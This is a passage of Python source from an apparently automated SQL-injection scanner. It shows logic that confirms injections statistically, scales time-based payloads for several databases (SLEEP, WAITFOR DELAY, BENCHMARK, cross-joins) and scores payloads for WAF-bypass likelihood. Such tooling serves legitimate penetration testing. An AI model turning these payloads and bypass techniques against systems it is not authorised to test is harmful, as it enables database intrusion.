            # the MSSQL error-cast check after passing the Oracle block, which looked
            # for MSSQL conversion-error patterns ("conversion failed", etc.) in Oracle
            # response bodies — these patterns never match, so the MSSQL path returned
            # (False, 0.0) silently, blocking the Oracle boolean guard chain below.
            # Fix: skip MSSQL path if this was already identified as an Oracle payload.
            # For MSSQL error-cast payloads, look for the conversion-error fingerprint
            # in the true_fp body.  If the error is present there but absent from
            # false_fp (and the baseline), this IS a genuine SQL injection.
            _mssql_err_pats = [
                r"conversion failed",
                r"converting the (?:varchar|nvarchar) value",
                r"cannot convert a char value",
                r"syntax error converting",
                r"invalid column name",  # from CHARINDEX/PATINDEX on missing col
            ]
            # BUG-FPGUARD-FP-UNDEFINED FIX (MSSQL path): Same as Oracle path above.
            # `fp` is not defined here; must use `true_fp` and `false_fp`.
            _tf_body = (_safe_decode_body(true_fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
                        if true_fp and true_fp.body else "")
            _ff_body = (_safe_decode_body(false_fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
                        if false_fp and false_fp.body else "")
            _bl_body = ""
            if isinstance(baseline, dict) and baseline.get("samples"):
                try:
                    # FIX #3d: Properly validate baseline array before indexing
                    _samples = baseline.get("samples")
                    if isinstance(_samples, list) and len(_samples) > 0:
                        _baseline_sample = _samples[0]
                        if hasattr(_baseline_sample, 'body') and _baseline_sample.body:
                            _bl_body = _safe_decode_body(_baseline_sample, func_name="mssql_baseline").lower()
                except Exception as _baseline_err:
                    LOG.debug(f"[mssql_error] Failed to decode baseline: {_baseline_err}")
                    pass
            _err_in_true  = any(_re.search(p, _tf_body) for p in _mssql_err_pats)
            _err_in_false = any(_re.search(p, _ff_body) for p in _mssql_err_pats)
            _err_in_base  = any(_re.search(p, _bl_body) for p in _mssql_err_pats)
            if _err_in_true and not _err_in_false and not _err_in_base:
                print("[+] [FP-Guards] MSSQL error-cast payload confirmed via "
                      "conversion-error fingerprint in true_fp", flush=True)
                return True, 0.92
            elif _err_in_base:
                LOG.debug("[FP-Guards] MSSQL conversion error in baseline — FP suppressed")
                return False, 0.0
            # No conversion error pattern seen — fall through to normal boolean guards
            # (the payload may be a tautology type like SUBSTRING(...) = SUBSTRING(...))

        # RC-FINDING-WAF-BLOCKED-FPG: Early exit when BOTH fingerprint probes (true_fp and
        # false_fp) were WAF-blocked (HTTP 400/403/406). The L1 repetition loop sends
        # `original + true_payload` fresh — the same payload the WAF blocked at detection
        # time — so those probes WILL also be blocked, returning _l1_probes_sent=0, which
        # now correctly returns (False, 0.0). Bail out early to avoid sending the probes
        # at all and to log a clear reason for rejection.
        _WAF_BLOCK_STS = {400, 403, 406}
        _fpg_t_status = int(getattr(true_fp, 'status_code', 0) or 0) if true_fp else 0
        _fpg_f_status = int(getattr(false_fp, 'status_code', 0) or 0) if false_fp else 0
        if _fpg_t_status in _WAF_BLOCK_STS and _fpg_f_status in _WAF_BLOCK_STS:
            _fpg_t_body = getattr(true_fp, 'body', b'') or b''
            _fpg_f_body = getattr(false_fp, 'body', b'') or b''
            _fpg_waf_sim = SimHasher.body_similarity(
                ResponseNormaliser.normalise(_fpg_t_body),
                ResponseNormaliser.normalise(_fpg_f_body))
            if _fpg_waf_sim >= 0.85:
                LOG.debug('[FP-Guards] Both true_fp (%d) and false_fp (%d) WAF-blocked with '
                          'similar bodies (sim=%.3f) — L1 probes will also be blocked; '
                          'rejecting to prevent WAF-noise FP',
                          _fpg_t_status, _fpg_f_status, _fpg_waf_sim)
                return False, 0.0

        # ── Layer 1: FalsePositiveGuardV18  6 independent checks ──────────────
        # L1=repetition(3×), L2=negation, L3=Fisher-exact p-value,
        # L4=cross-param correlation, L5=clean-cluster, L6=reflection-strip
        _fpg = get_v18_fp_guard()
        # BUG-FPG-BODY-NULL FIX (Req 3): Guard against None body.
        # If the baseline sample's body is None (network error during baseline capture),
        # calling record_clean(None) would crash inside ResponseNormaliser.normalise().
        # Use `or b""` to treat a missing body as an empty document, which is neutral
        # and avoids both the crash and polluting the clean cluster with empty bytes.
        # FIX #3h: Properly validate baseline array before indexing
        if baseline and isinstance(baseline.get('samples'), list) and len(baseline.get('samples', [])) > 0:
            _baseline_sample = baseline['samples'][0]
            _bl_body_fpg = _baseline_sample.body if (hasattr(_baseline_sample, 'body') and _baseline_sample.body) else b""
            _fpg.record_clean(_bl_body_fpg)
        _fg_ok, _fg_conf = await _fpg.verify(
            engine, config, method, url, data, data_fmt,
            param, original, tamper_chain, baseline,
            true_payload, false_payload, true_fp, false_fp,
            technique=technique)
        if not _fg_ok:
            LOG.debug(f'[FP-Guards] FalsePositiveGuardV18 rejected {param!r} '
                      f'(conf={_fg_conf:.3f}) — L1-L6 check failed')
            return False, 0.0

        # ── Layer 2: WelchConfirmer  paired t-test, N=4 pairs, p<0.05 ─────────
        # BUG-WELCH-N-PAIRS FIX (Req 3): n_pairs=4 gives only 4×2=8 total probes.
        # On jittery networks (CDN, cloud), 8 probes give insufficient statistical
        # power to distinguish injection-triggered body changes from page-dynamism.
        # Raising to 5 pairs (10 probes) adds 2 more probes but cuts p-value by
        # ~30% for genuine injections — better FP rejection with acceptable latency.
        # BUG-7-FIX (Req 3): n_pairs=6 is problematic on high-latency CDN targets.
        # At 5s RTT × 6 pairs × 2 probes = 60s just for WelchConfirmer, exceeding
        # the asyncio task timeout window. Inject FP rejection noise on slow targets.
        # Fix: derive n_pairs adaptively from estimated RTT:
        #   RTT <  0.5s → 6 pairs (max statistical power)
        #   RTT  0.5–2s → 5 pairs
        #   RTT  2–5s   → 4 pairs
        #   RTT > 5s    → 3 pairs (minimum viable Welch test)
        # RTT estimate from baseline samples (already gathered before _run_fp_guards_boolean).
        _welch_rtt_ms = 500.0  # default conservative assumption
        try:
            _bl_samps = (baseline or {}).get('samples', [])
            if _bl_samps and hasattr(_bl_samps[0], 'elapsed_ms') and _bl_samps[0].elapsed_ms > 0:
                _welch_rtt_ms = float(_bl_samps[0].elapsed_ms)
        except Exception:
            pass
        if _welch_rtt_ms < 500:
            _welch_n_pairs = 6
        elif _welch_rtt_ms < 2000:
            _welch_n_pairs = 5
        elif _welch_rtt_ms < 5000:
            _welch_n_pairs = 4
        else:
            _welch_n_pairs = 3  # slow CDN — minimum viable
        _wc_ok, _wc_pval, _wc_reason = await WelchConfirmer.confirm(
            engine, config, method, url, data, data_fmt,
            param, original, tamper_chain,
            true_payload, false_payload, baseline, n_pairs=_welch_n_pairs,
            technique=technique)
        if not _wc_ok:
            LOG.debug(f'[FP-Guards] WelchConfirmer rejected {param!r}: {_wc_reason}')
            return False, 0.0

        # ── Layer 3: FalsePositiveValidator  mean/variance statistical check ─
        _fv = await FalsePositiveValidator.validate(
            engine, method, url, data, data_fmt,
            param, original, true_payload, false_payload,
            tamper_chain, n_trials=3, config=config, technique=technique)
        if not _fv.get('valid', False):
            LOG.debug(f'[FP-Guards] FalsePositiveValidator rejected {param!r}: '
                      f'conf={_fv.get("confidence",0):.3f}')
            return False, 0.0

        # ── PCV-FIX-4: Update BlindBoolCalibrator with observed similarities ──
        try:
            import math as _mth
            if true_fp and false_fp:
                from functools import reduce as _red
                # FIX CRITICAL BUG: baseline.get('samples',[{}])[0] may be a dict {}, not a response object
                # Safe extraction: check if samples[0] has body attribute and is a response object
                _bl_samples = baseline.get('samples', []) if baseline else []
                _bl_body = b''
                if _bl_samples and _bl_samples[0] and hasattr(_bl_samples[0], 'body'):
                    _bl_body = _extract_body_safe(_bl_samples[0])
                
                _sim_t = SimHasher.body_similarity(
                    ResponseNormaliser.normalise(_bl_body),
                    ResponseNormaliser.normalise(_extract_body_safe(true_fp)) if _validate_response(true_fp, allow_empty=True) else b"")
                _sim_f = SimHasher.body_similarity(
                    ResponseNormaliser.normalise(_bl_body),
                    ResponseNormaliser.normalise(_extract_body_safe(false_fp)) if _validate_response(false_fp, allow_empty=True) else b"")
                _BOOL_CALIBRATOR_MODULE.record_true(_sim_t)
                _BOOL_CALIBRATOR_MODULE.record_false(_sim_f)
        except Exception:
            pass

        # BUG-PCV-CONF FIX: Divide by 3.0 (number of guard terms), not 2.5.
        # _fg_conf ∈ [0,1], _fv confidence ∈ [0,1], (1-_wc_pval) ∈ [0,1].
        # Dividing their sum by 2.5 gave a maximum possible raw value of 1.2
        # (clipped to 1.0 by min()), but also inflated mid-quality detections:
        # e.g. three guards each returning 0.7 gave 2.1/2.5 = 0.84 confidence
        # instead of the correct 0.7 — making borderline detections look stronger.
        # BUG-FPG-2 FIX: use 0.0 as default FPV confidence (absent = no signal,
        # not a 70% signal). The old 0.7 default inflated borderline detections.
        _confidence = min(1.0, (_fg_conf + _fv.get('confidence', 0.0)
                                + (1.0 - _wc_pval)) / 3.0)
        return True, _confidence

      except Exception as _fpge:
        # BUG-FPGUARD-SILENT-FAIL FIX: was LOG.debug — upgraded to WARNING.
        # An exception here means ALL three guards (FalsePositiveGuardV18 +
        # WelchConfirmer + FalsePositiveValidator) were skipped.  Silent
        # rejection at DEBUG level hides programming errors that cause
        # genuine injections to fail confirmation with no visible trace.
        LOG.warning(f'[FP-Guards] exception for {param!r}: '
                    f'{type(_fpge).__name__}: {_fpge} — failing safe (reject)',
                    exc_info=True)
        return False, 0.0
    finally:
        # BUG-PCV-REFCOUNT FIX: decrement counter on ALL exit paths.
        # (normal return, exception, asyncio.CancelledError)
        # FIX-R12-B: Clamp to 0 — prevents negative counter values that leave
        # _send_injected gate permanently open (not _PCV_IN_PROGRESS[0] is False for -1).
        _PCV_IN_PROGRESS[0] = max(0, _PCV_IN_PROGRESS[0] - 1)


def _make_robust_timing_payload_fn(base_payload: str):
    """
    PCV-FIX-5: Return delay_payload_fn(delay_sec) for RobustTimingOracle.confirm().
    Replaces the sleep-function argument in base_payload with the requested delay.
    Returns the suffix (payload without original-param prefix) so
    _ROBUST_TIMING.confirm() can call original+fn(delay).

    BUG-PCV-1 FIX: Added SQLite-specific patterns.
    SQLite has no SLEEP() function; it uses RANDOMBLOB(n) or recursive CTEs for
    timing.  Without these patterns, _fn(delay_sec) always returned base_payload
    unchanged — RobustTimingOracle sent identical payloads in all 3 escalating
    rounds, making CDN-jitter indistinguishable from real timing injection.

    For RANDOMBLOB: scale size proportional to delay_sec so round-0 (5s) sends
    RANDOMBLOB(50_000_000), round-1 (7.5s) sends RANDOMBLOB(75_000_000), etc.
    Cap at 50MB (50_000_000) to avoid OOM-killing the target server — an
    important constraint for responsible bug-bounty use.

    For CTE recursion limits (LIMIT N or WHERE x<N): scale the bound so the
    computation workload grows proportionally across rounds.
    """
    _SLEEP_PATTERNS = [
        (r'(SLEEP\s*\(\s*)[\d.]+', '{g1}{v}'),
        (r'(pg_sleep\s*\(\s*)[\d.]+', '{g1}{v}'),
        (r'(DBMS_LOCK\.SLEEP\s*\(\s*)[\d.]+', '{g1}{v}'),
        (r'(DBMS_SESSION\.SLEEP\s*\(\s*)[\d.]+', '{g1}{v}'),
        # NOTE: WAITFOR DELAY is handled separately below to use integer seconds
        (r'(RECEIVE_MESSAGE\s*\([^,]+,\s*)[\d.]+', '{g1}{v}'),
    ]
    # WAITFOR DELAY handled separately: MSSQL requires 'hh:mm:ss' with integer seconds.
    # str(round(delay_sec, 3)) produces '5.0' which is rejected with Msg 170 syntax error.
    # FIX-3 (REQ 3 / MSSQL timing PCV): Use integer seconds for WAITFOR DELAY substitution.
    _WAITFOR_PAT = _re.compile(
        r"(WAITFOR\s+DELAY\s*['\"])\d+:\d+:[\d.]+(['\"])",
        _re.IGNORECASE)
    # BUG-PCV-1 FIX: SQLite patterns — scale computation size with delay_sec.
    # RANDOMBLOB: each pattern replaces the byte-count argument.
    # CTE recursion: replace the upper-bound literal in WHERE x<N or LIMIT N.
    # These use a different substitution model (blob_size) so handled separately.
    _SQLITE_RANDOMBLOB = _re.compile(r'RANDOMBLOB\s*\(\s*\d+\s*\)', _re.IGNORECASE)
    # Match the recursion bound in WHERE-based CTEs: "WHERE x<99999" or "LIMIT 99999"
    _SQLITE_CTE_WHERE  = _re.compile(r'(WHERE\s+\w+\s*<\s*)(\d{5,})', _re.IGNORECASE)
    _SQLITE_CTE_LIMIT  = _re.compile(r'(LIMIT\s+)(\d{5,})', _re.IGNORECASE)

    def _fn(delay_sec: float) -> str:
        _v = str(round(delay_sec, 3))

        # ── Standard SLEEP-style patterns ────────────────────────────────────
        for _pat, _fmt in _SLEEP_PATTERNS:
            def _sub(m, _v=_v, _fmt=_fmt):
                return _fmt.format(g1=m.group(1), v=_v)
            _result = _re.sub(_pat, _sub, base_payload, count=1,
                               flags=_re.IGNORECASE)
            if _result != base_payload:
                return _result  # already the full payload-suffix

        # ── FIX-3 (REQ 3): MSSQL WAITFOR DELAY — integer seconds only ────────
        # MSSQL T-SQL requires 'hh:mm:ss' format with integer fields.
        # Fractional seconds < 1s are OK as '0:0:0.NNN'; >= 1s must be integer.
        if _WAITFOR_PAT.search(base_payload):
            try:
                _wf_int = int(round(delay_sec))
                if _wf_int >= 1:
                    _wf_str = f"0:0:{_wf_int:02d}"
                else:
                    # Sub-second: format as '0:0:0.NNN'
                    _wf_str = f"0:0:{delay_sec:.3f}".rstrip('0').rstrip('.')
                    if '.' not in _wf_str:
                        _wf_str = "0:0:0.001"  # at least 1ms
                def _wf_sub(m):
                    # BUG-MSSQL-WAITFOR-DOUBLE-PREFIX FIX: _wf_str already contains the
                    # full "0:0:N" or "0:0:0.NNN" format.  The old code prepended an
                    # extra "0:0:" producing "WAITFOR DELAY '0:0:0:0:N'" which MSSQL
                    # rejects with "Incorrect syntax near '0'".  Remove the duplicate prefix.
                    return m.group(1) + _wf_str + m.group(2)
                _result = _WAITFOR_PAT.sub(_wf_sub, base_payload, count=1)
                if _result != base_payload:
                    return _result
            except Exception:
                pass

        # ── BUG-PCV-1 / BUG-3B FIX: SQLite RANDOMBLOB scaling ───────────────
        # BUG-3B ROOT CAUSE: With scale=10MB/s and hard cap=50MB, ALL three
        # RobustTimingOracle rounds (5s→50MB, 7.5s→50MB, 11.25s→50MB) hit the
        # cap immediately and send IDENTICAL payloads.  The escalating-delay test
        # is supposed to distinguish CDN jitter (constant latency) from real
        # computation (latency grows with work); when all three rounds use 50MB
        # the confirmation is not escalating at all — CDN jitter can pass it.
        # FIX: Use a 3-tier cap ladder so each RobustTimingOracle round sends a
        # meaningfully larger RANDOMBLOB, while keeping the absolute maximum at
        # 50MB for responsible scanning:
        #   round-0 (≤5s base_delay)  → cap 15MB  (low, fast round)
        #   round-1 (5–8s range)      → cap 30MB  (medium)
        #   round-2 (≥8s range)       → cap 50MB  (max, definitive)
        # This ensures latency genuinely scales across rounds: 15MB < 30MB < 50MB
        # allocation times are measurably different on real SQLite, while CDN
        # jitter is flat regardless of blob size — cleanly separable.
        if delay_sec <= 5.0:
            _MAX_BLOB = 15_000_000   # round-0: 15MB
        elif delay_sec <= 8.0:
            _MAX_BLOB = 30_000_000   # round-1: 30MB
        else:
            _MAX_BLOB = 50_000_000   # round-2+: 50MB hard cap
        _blob_size = min(int(delay_sec * 3_000_000), _MAX_BLOB)  # 3MB/s baseline scale
        if _SQLITE_RANDOMBLOB.search(base_payload):
            _result = _SQLITE_RANDOMBLOB.sub(
                f'RANDOMBLOB({_blob_size})', base_payload, count=1)
            if _result != base_payload:
                return _result

        # ── BUG-PCV-1 FIX: SQLite CTE recursion-bound scaling ────────────────
        # Scale: 2M iterations per second, capped at 10M for CPU safety.
        _MAX_ITER = 10_000_000
        _iter_count = min(int(delay_sec * 2_000_000), _MAX_ITER)
        if _SQLITE_CTE_WHERE.search(base_payload):
            _result = _SQLITE_CTE_WHERE.sub(
                lambda m: m.group(1) + str(_iter_count), base_payload, count=1)
            if _result != base_payload:
                return _result
        if _SQLITE_CTE_LIMIT.search(base_payload):
            _result = _SQLITE_CTE_LIMIT.sub(
                lambda m: m.group(1) + str(_iter_count), base_payload, count=1)
            if _result != base_payload:
                return _result

        # ── FIX-ORACLE-ROWNUM-SCALE: Oracle heavy-query ROWNUM escalation ────
        # Oracle cross-join timing payloads use ROWNUM<N as the work-factor:
        #   SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000
        # Without this block, all 3 RobustTimingOracle rounds send the IDENTICAL
        # payload because no SLEEP()/RANDOMBLOB() value can be found to substitute.
        # RobustTimingOracle requires escalating latency across rounds to distinguish
        # real SQL execution from CDN jitter — identical payloads produce constant
        # latency → confirmed=False for every Oracle HQ injection (false negative).
        #
        # Fix: scale the ROWNUM<N limit proportionally with delay_sec so each round
        # performs more cross-join work:
        #   round-0 (base_delay=5s)   → ROWNUM<50000   (baseline work)
        #   round-1 (base_delay=7.5s) → ROWNUM<75000   (1.5× work, 1.5× delay)
        #   round-2 (base_delay=11s)  → ROWNUM<110000  (2.2× work, 2.2× delay)
        # CDN jitter doesn't scale with ROWNUM; real Oracle cross-joins do.
        # Cap at ROWNUM<500000 to avoid OOM/timeout on the target database server.
        _ORACLE_ROWNUM_RE = _re.compile(
            r'(WHERE\s+ROWNUM\s*<\s*)(\d+)', _re.IGNORECASE)
        if _ORACLE_ROWNUM_RE.search(base_payload):
            # Base ROWNUM from the payload (e.g. 50000 for round-0 at base_delay=5s)
            _base_rownum_m = _ORACLE_ROWNUM_RE.search(base_payload)
            try:
                _base_rownum = int(_base_rownum_m.group(2))
            except (ValueError, AttributeError):
                _base_rownum = 50000
            # Scale: proportional to delay_sec / base_delay(5s).
            # Round-0 (5s): ratio=1.0 → same ROWNUM as original.
            # Round-1 (7.5s): ratio=1.5 → 1.5× ROWNUM.
            # Round-2 (11.25s): ratio=2.25 → 2.25× ROWNUM.
            _rownum_ratio = max(1.0, delay_sec / 5.0)
            _scaled_rownum = min(int(_base_rownum * _rownum_ratio), 500_000)
            _result = _ORACLE_ROWNUM_RE.sub(
                lambda m: m.group(1) + str(_scaled_rownum),
                base_payload, count=1)
            if _result != base_payload:
                return _result

        # ── FIX-ORACLE-DBMS-PIPE-SCALE: Oracle DBMS_PIPE.RECEIVE_MESSAGE ─────
        # DBMS_PIPE.RECEIVE_MESSAGE('ch', N) blocks for N seconds (or until timeout).
        # The existing _SLEEP_PATTERNS list already handles RECEIVE_MESSAGE via:
        #   (r'(RECEIVE_MESSAGE\s*\([^,]+,\s*)[\d.]+', '{g1}{v}')
        # But only for the main pattern. Ensure the Oracle-specific variant also
        # matches BEGIN...DBMS_PIPE...END blocks used in S-technique stacked probes.
        # This is covered by the existing RECEIVE_MESSAGE pattern above; no extra fix needed.

        # BUG-HQ-PGSQL-PCV FIX: PostgreSQL pg_class cross-join payloads have NO sleep
        # value to substitute, so _make_robust_timing_payload_fn returned them unchanged.
        # RobustTimingOracle then sent IDENTICAL payloads in all 3 escalating rounds →
        # CDN jitter indistinguishable from real injection → ALL PostgreSQL HQ detections
        # silently fail PCV. Fix: add LIMIT N before the trailing comment to scale work.
        _PGSQL_PGCLASS_RE = _re.compile(r'FROM\s+pg_class\s+\w+', _re.IGNORECASE)
        if _PGSQL_PGCLASS_RE.search(base_payload):
            _pg_limit = min(int(10000 * max(1.0, delay_sec / 5.0)), 50000)
            _cmt_re = _re.compile(r'(\s*--[- +].*?$|\s*#.*?$)', _re.MULTILINE)
            _cmt_m = _cmt_re.search(base_payload)
            if _cmt_m:
                _ins = _cmt_m.start()
                _result = base_payload[:_ins] + f' LIMIT {_pg_limit}' + base_payload[_ins:]
            else:
                _result = base_payload + f' LIMIT {_pg_limit}'
            if _result != base_payload:
                return _result

        # BUG-HQ-MYSQL-PCV FIX: MySQL BENCHMARK(N, expr) — not matched by any SLEEP
        # pattern — returned unchanged. Scale the iteration count proportionally.
        _BENCHMARK_RE = _re.compile(r'(BENCHMARK\s*\(\s*)(\d+)(\s*,)', _re.IGNORECASE)
        _bm_match = _BENCHMARK_RE.search(base_payload)
        if _bm_match:
            try:
                _bm_base = int(_bm_match.group(2))
            except (ValueError, AttributeError):
                _bm_base = 50_000_000
            _bm_scaled = min(int(_bm_base * max(1.0, delay_sec / 5.0)), 500_000_000)
            _result = _BENCHMARK_RE.sub(
                lambda m: m.group(1) + str(_bm_scaled) + m.group(3),
                base_payload, count=1)
            if _result != base_payload:
                return _result

        # BUG-HQ-MSSQL-PCV FIX: MSSQL sysobjects/sys.objects cross-join payloads.
        # Scale by injecting TOP N to limit the cross-join work.
        _SYSOBJ_RE = _re.compile(
            r'FROM\s+(?:sysobjects|sys\.objects|sys\.columns)\s+\w+', _re.IGNORECASE)
        if _SYSOBJ_RE.search(base_payload):
            _ms_top = min(int(5000 * max(1.0, delay_sec / 5.0)), 100_000)
            _result = _re.sub(
                r'(SELECT\s+)(COUNT\(\*\)|COUNT\(1\))',
                lambda m: m.group(1) + f'TOP {_ms_top} ' + m.group(2),
                base_payload, count=1, flags=_re.IGNORECASE)
            if _result != base_payload:
                return _result

        # BUG-HQ-INFOSCHEMA-PCV FIX: information_schema cross-join payloads.
        # Used by MySQL/PostgreSQL/MSSQL HQ techniques. Append LIMIT before comment.
        _ISCHEMA_RE = _re.compile(
            r'FROM\s+information_schema\.\w+\s+\w+', _re.IGNORECASE)
        if _ISCHEMA_RE.search(base_payload):
            _is_limit = min(int(1000 * max(1.0, delay_sec / 5.0)), 20_000)
            _cmt_re2 = _re.compile(r'(\s*--[- +].*?$|\s*#.*?$)', _re.MULTILINE)
            # FIX-BUG-CMT-RE2: was `_cmt_re.search(...)` — `_cmt_re` is defined only
            # in the earlier pg_class block and may not be in scope here, causing a
            # NameError that the outer try/except swallows silently.  The correct
            # variable is `_cmt_re2`, defined two lines above.  This bug caused all
            # MySQL/PostgreSQL/MSSQL information_schema HQ timing payloads to skip
            # LIMIT insertion, sending identical payloads in all 3 RobustTimingOracle
            # rounds → CDN jitter indistinguishable from real injection → PCV always fails.
            _cmt_m2 = _cmt_re2.search(base_payload)
            if _cmt_m2:
                _ins2 = _cmt_m2.start()
                _result = base_payload[:_ins2] + f' LIMIT {_is_limit}' + base_payload[_ins2:]
            else:
                _result = base_payload + f' LIMIT {_is_limit}'
            if _result != base_payload:
                return _result

        return base_payload  # no match: return as-is (uses original sleep value)
    return _fn


# 
# 2.  TRIGRAM WAF BYPASS PREDICTOR
#     Scores a payload's WAF bypass probability using character trigrams
#     observed in historically successful bypass strings (from KnowledgeBase).
#     High-bypass payloads are promoted in the evolution engine.
# 

class TrigramWAFPredictor:
    """
    Scores a payload against a learnt trigram language model of bypassing payloads.
    Score  [0,1] where 1 = trigram profile identical to known-good bypass.

    Training is incremental (online): each successful bypass updates the model.
    """
    def __init__(self, smoothing: float = 0.1):
        self._trigram_counts: dict[str, int] = {}
        self._total: int = 0
        self._smoothing = smoothing  # Laplace smoothing

    def train(self, payload: str):
        """Add a known-good bypass payload to the model."""
        for i in range(len(payload) - 2):
            gram = payload[i:i+3]
            self._trigram_counts[gram] = self._trigram_counts.get(gram, 0) + 1
            self._total += 1

    def score(self, payload: str) -> float:
        """
        Return bypass probability  [0,1].
        Uses Laplace-smoothed log-probability (converted to probability space).
        """
        if not self._trigram_counts or len(payload) < 3:
            return 0.5  # uninformed prior
        log_prob = 0.0
        n_grams = 0
        vocab = len(self._trigram_counts)
        for i in range(len(payload) - 2):
            gram = payload[i:i+3]
            count = self._trigram_counts.get(gram, 0)
            # Laplace smoothed probability
            p = (count + self._smoothing) / (self._total + self._smoothing * max(vocab, 1))
            log_prob += _math2.log(max(p, 1e-12))
            n_grams += 1
        if n_grams == 0:
            return 0.5
        # Normalise to [0,1] via sigmoid on average log-prob
        avg_lp = log_prob / n_grams
        return round(1.0 / (1.0 + _math2.exp(-avg_lp * 2)), 4)

    def top_trigrams(self, n: int = 10) -> list[tuple[str, int]]:
        """Return most common trigrams in successful bypasses."""
        return sorted(self._trigram_counts.items(), key=lambda x: x[1], reverse=True)[:n]


# 
# 3.  MULTI-ARMED BANDIT TECHNIQUE SELECTOR  (Thompson Sampling)
#     Replaces the static TechniquePriorityQueue with a proper bandit that
#     learns from feedback during the scan.  Each technique (E/B/U/T/S/)
#     is an arm; pulling = trying; reward = 1 if confirmed, 0 if not.
#     Thompson sampling draws from a Beta(, ) posterior each trial.
# 

class MultiArmedBanditTechSelector:
    """
    Thompson-sampling bandit for technique scheduling.

    For each technique, maintains Beta(alpha, beta) posterior:
      alpha = 1 + successes
      beta  = 1 + failures
    Draws a sample from each arm, tries the highest-scoring arm first.

    Adapts to the target in real time: if error-based keeps succeeding on
    this host, it will be tried first on subsequent parameters automatically.
    """
    # FIX-BANDIT-2: only track technique IDs that exist in TECHNIQUE_PRIORITY_ORDER.
    # The original list included "N","X","L","I","P" which are not valid technique IDs,
    # diluting the Bayesian posterior and wasting Thompson-sampling budget.
    ARMS = ["E", "B", "U", "T", "S", "O"]

    def __init__(self):
        # (alpha, beta) per arm  start with uniform prior Beta(1,1)
        self._params: dict[str, tuple[float, float]] = {
            arm: (1.0, 1.0) for arm in self.ARMS
        }
        self._pulls: dict[str, int] = {arm: 0 for arm in self.ARMS}

    def record(self, technique: str, success: bool):
        """Update posterior after observing outcome."""
        a, b = self._params.get(technique, (1.0, 1.0))
        if success:
            self._params[technique] = (a + 1.0, b)
        else:
            self._params[technique] = (a, b + 1.0)
        self._pulls[technique] = self._pulls.get(technique, 0) + 1

    def ranked(self, requested: str) -> list[str]:
        """
        Return techniques in Thompson-sampled priority order.
        Only includes techniques present in requested (e.g. "BEUTS" or "B,E,T,S").

        Parsing is consistent with TechniqueCascadeEngine.try_all():
          - "ALL" / "*"             include every ARMS entry
          - Comma/space-delimited   tokenise; multi-char IDs (HQ,EH,BH) are valid
                                     but not tracked by bandit (harmlessly absent)
          - Single joined string    fall back to iterating characters ("BETUS")
        """
        if requested.upper() in ("ALL", "*"):
            _req = set(self.ARMS)
        else:
            tokens = re.split(r'[,\s]+', requested.strip().upper())
            # Old joined style: single token "BETUS"  iterate characters
            if len(tokens) == 1 and len(tokens[0]) > 1 and tokens[0] not in self.ARMS:
                _req = set(tokens[0])
            else:
                _req = set(tokens)
        samples: list[tuple[float, str]] = []
        for arm in self.ARMS:
            if arm not in _req:
                continue
            a, b = self._params[arm]
            # Sample from Beta distribution using the Johnk method
            # (no scipy dependency)
            sample = self._beta_sample(a, b)
            samples.append((sample, arm))
        samples.sort(reverse=True)
        return [arm for _, arm in samples]

    @staticmethod
    def _beta_sample(alpha: float, beta: float) -> float:
        """Sample from Beta(alpha, beta) via Johnk's method."""
        if alpha <= 0 or beta <= 0:
            return 0.5
        # Use gamma-ratio method: Beta = Gamma(a) / (Gamma(a) + Gamma(b))
        try:
            x = random.gammavariate(alpha, 1.0)
            y = random.gammavariate(beta, 1.0)
            return x / max(x + y, 1e-12)
        except Exception:
            return alpha / max(alpha + beta, 1e-12)

    @property
    def stats(self) -> dict[str, dict]:
        result = {}
        for arm in self.ARMS:
            a, b = self._params[arm]
            mean = a / max(a + b, 1e-12)
            result[arm] = {"mean": round(mean, 3), "pulls": self._pulls.get(arm, 0),
                           "alpha": a, "beta": b}
        return result


# 
# 4.  BLOOM PAYLOAD FILTER  (40 more memory-efficient than set)
#     Tracks already-tested payloads without storing them, using a Bloom
#     filter with configurable false-positive rate.
# 

class BloomPayloadFilter:
    """
    Space-efficient probabilistic set membership test.

    At capacity=500K items, FP_rate=0.001 uses ~7.2 MB vs ~64 MB for a set().

    Uses double-hashing (FNV-64 + djb2-64) for k hash functions.
    """
    def __init__(self, capacity: int = 500_000, fp_rate: float = 0.001):
        # Compute optimal bit-array size m and number of hash functions k
        m = int(-capacity * _math2.log(fp_rate) / (_math2.log(2) ** 2))
        k = max(1, int((m / capacity) * _math2.log(2)))
        self._m = m
        self._k = k
        self._bits = bytearray((m + 7) // 8)
        self._count = 0

    def _hashes(self, item: str) -> list[int]:
        """Generate k hash values for item."""
        b = item.encode("utf-8", errors="replace")
        # Two independent hash seeds via different FNV offsets
        h1 = 14695981039346656037
        h2 = 0xcbf29ce484222325
        for byte in b:
            h1 = ((h1 ^ byte) * 1099511628211) & 0xFFFFFFFFFFFFFFFF
            h2 = ((h2 ^ byte) * 16777619) & 0xFFFFFFFFFFFFFFFF
        # Double-hashing: h(i) = h1 + i*h2
        return [(h1 + i * h2) % self._m for i in range(self._k)]

    def add(self, payload: str) -> bool:
        """Add payload. Returns True if already present (approximate)."""
        hashes = self._hashes(payload)
        seen = all((self._bits[h >> 3] >> (h & 7)) & 1 for h in hashes)
        for h in hashes:
            self._bits[h >> 3] |= 1 << (h & 7)
        self._count += 1
        return seen

    def __contains__(self, payload: str) -> bool:
        hashes = self._hashes(payload)
        return all((self._bits[h >> 3] >> (h & 7)) & 1 for h in hashes)

    @property
    def estimated_fp_rate(self) -> float:
        """Current estimated false positive rate."""
        p_bit_set = 1 - _math2.exp(-self._k * self._count / max(self._m, 1))
        return p_bit_set ** self._k


# 
# 5.  TEMPORAL ANOMALY DETECTOR  (precision time-based injection)
#     Rolling-window clock-skew compensation + outlier rejection using
#     modified Z-score (MAD-based, robust to timing spikes).
# 

class TemporalAnomalyDetector:
    """
    Precision timing analysis for time-based SQL injection.

    Problems with naive mean/std timing:
     1. Network jitter adds Gaussian noise (handled by std dev)
     2. GC pauses, load spikes add heavy-tailed outliers (std dev fails)
     3. CDN/WAF response caches can give instant responses regardless of SQL
     4. Connection warm-up is slower than sustained connections

    This class:
     - Uses MAD (Median Absolute Deviation) instead of std for outlier-robust
       threshold computation
     - Detects and excludes CDN cache hits (near-zero response times)
     - Maintains a rolling window of 30 baseline observations
     - Computes a clock-skew estimate from consecutive requests
    """
    WINDOW = 30
    MAD_SCALE = 1.4826  # converts MAD to approximate std dev for normal dist

    def __init__(self):
        self._window: _dq2 = _dq2(maxlen=self.WINDOW)
        self._cdn_cache_threshold_ms = 5.0  # responses faster than this = cached

    def record_baseline(self, elapsed_ms: float):
